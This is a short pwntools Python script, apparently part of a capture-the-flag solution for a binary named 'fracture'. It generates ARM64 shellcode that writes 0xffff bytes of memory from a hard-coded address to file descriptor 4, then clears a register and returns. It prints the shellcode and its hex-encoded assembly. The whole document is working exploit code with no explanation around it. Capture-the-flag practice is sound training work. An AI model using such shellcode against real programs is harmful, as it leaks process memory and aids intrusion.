from pwn import *

elf = context.binary = ELF("/home/kali/cybertalent/fracture")

shellcode = shellcraft.write(0x4, 0x55018238e0, 0xffff)
shellcode += """
    eor x0, x0, x0
    ret
"""

print(shellcode)
print(enhex(asm(shellcode)))